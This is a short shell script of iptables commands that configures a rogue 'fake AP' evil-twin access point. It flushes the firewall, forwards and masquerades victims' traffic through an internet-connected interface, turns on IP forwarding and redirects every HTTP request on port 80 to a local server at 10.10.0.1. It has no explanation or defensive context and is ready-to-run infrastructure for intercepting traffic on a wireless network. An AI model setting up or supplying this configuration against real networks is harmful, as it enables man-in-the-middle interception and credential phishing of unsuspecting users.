# wlan0 = AP with internet connection
# wlan0mon = the fake AP

iptables --flush
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE 
iptables --append FORWARD --in-interface wlan0mon -j ACCEPT 
iptables -t nat -A POSTROUTING -j MASQUERADE
# might have to comment out next line
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.10.0.1:80
#iptables -t nat -A OUTPUT -j DNAT --to-destination 127.0.0.1
echo 1 > /proc/sys/net/ipv4/ip_forward
